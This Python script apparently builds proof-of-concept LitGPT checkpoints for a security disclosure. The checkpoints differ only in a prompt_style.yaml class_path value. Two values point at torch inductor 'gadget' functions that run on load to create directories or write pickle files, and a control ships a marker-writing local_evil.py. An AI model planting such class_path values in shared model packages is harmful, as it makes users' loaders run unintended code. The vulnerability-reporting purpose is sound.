#!/usr/bin/env python
"""Build LitGPT prompt_style.yaml PoC checkpoints (Lightning-AI/litgpt @ 26857050, v0.5.13).

Creates four complete LitGPT checkpoints (identical weights / config / tokenizer,
built from a tiny random 2-layer model). The ONLY difference between them is the
plain string value of `class_path` inside prompt_style.yaml:

    gadget-cache-dir      torch._inductor.runtime.cache_dir_utils.cache_dir
                          -> zero-arg call creates the torch inductor cache dir
    gadget-saved-args     torch._inductor.debug.save_args_for_compile_fx_inner
                          -> zero-arg call writes %TEMP%/inductor_saved_args/*.pkl
    benign-default        litgpt.prompts.Default
                          -> the official value litgpt itself saves (negative control)
    local-code-control    local_evil.Evil, plus a local_evil.py file inside the
                          checkpoint directory that LitGPT must NOT import
                          (proves the model package carries no executable code)

Run with the venv that has the pinned litgpt installed:
    python make_poc.py
"""
import hashlib
import json
import shutil
from pathlib import Path

import torch
from litgpt import GPT, Config
from litgpt.utils import save_config

WORK = Path(__file__).resolve().parent
CKPT_ROOT = WORK / "checkpoints"

MODEL_CONFIG = {
    "name": "tiny-random",
    "block_size": 128,
    "n_layer": 2,
    "n_embd": 64,
    "n_head": 4,
    "vocab_size": 13,
    "padded_vocab_size": 16,
}

VOCAB = {
    "<|unk|>": 0,
    "<|bos|>": 1,
    "<|eos|>": 2,
    "the": 3,
    "cat": 4,
    "sat": 5,
    "on": 6,
    "mat": 7,
    "llamas": 8,
    "eat": 9,
    "food": 10,
    "what": 11,
    "do": 12,
}

VARIANTS = {
    "gadget-cache-dir": "torch._inductor.runtime.cache_dir_utils.cache_dir",
    "gadget-saved-args": "torch._inductor.debug.save_args_for_compile_fx_inner",
    "benign-default": "litgpt.prompts.Default",
    "local-code-control": "local_evil.Evil",
}

LOCAL_EVIL_PY = '''\
# local_evil.py is deliberately shipped INSIDE the checkpoint directory.
# If LitGPT imported model-directory files, Evil() below would drop a marker
# file next to this script when instantiated. The PoC shows it never runs.
class Evil:
    def __init__(self):
        from pathlib import Path

        Path(__file__).with_name("LOCAL_EVIL_RAN").write_text("imported")
'''


def build_tokenizer(dst: Path) -> None:
    from tokenizers import Tokenizer, models, pre_tokenizers

    tk = Tokenizer(models.WordLevel(vocab=VOCAB, unk_token="<|unk|>"))
    tk.pre_tokenizer = pre_tokenizers.Whitespace()
    tk.save(str(dst / "tokenizer.json"))
    (dst / "tokenizer_config.json").write_text(
        json.dumps(
            {
                "tokenizer_class": "PreTrainedTokenizerFast",
                "bos_token": "<|bos|>",
                "eos_token": "<|eos|>",
                "add_bos_token": False,
            },
            indent=2,
        ),
        encoding="utf-8",
    )


def build_checkpoint(dst: Path) -> None:
    dst.mkdir(parents=True, exist_ok=True)
    save_config(Config(**MODEL_CONFIG), dst)
    build_tokenizer(dst)
    torch.manual_seed(0)
    model = GPT(Config(**MODEL_CONFIG))
    torch.save(model.state_dict(), dst / "lit_model.pth")


def write_sha256_sums() -> None:
    lines = []
    for path in sorted(CKPT_ROOT.rglob("*")):
        if path.is_file():
            digest = hashlib.sha256(path.read_bytes()).hexdigest()
            lines.append(f"{digest}  {path.relative_to(WORK).as_posix()}")
    (WORK / "SHA256SUMS.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")


def main() -> None:
    if CKPT_ROOT.exists():
        shutil.rmtree(CKPT_ROOT)
    for name, class_path in VARIANTS.items():
        dst = CKPT_ROOT / name
        build_checkpoint(dst)
        (dst / "prompt_style.yaml").write_text(f"class_path: {class_path}\n", encoding="utf-8")
        if name == "local-code-control":
            (dst / "local_evil.py").write_text(LOCAL_EVIL_PY, encoding="utf-8")
        print(f"[+] checkpoints/{name}  class_path: {class_path}")
    write_sha256_sums()
    print(f"[+] SHA256SUMS.txt written ({len(list(CKPT_ROOT.rglob('*')))} files under checkpoints/)")


if __name__ == "__main__":
    main()
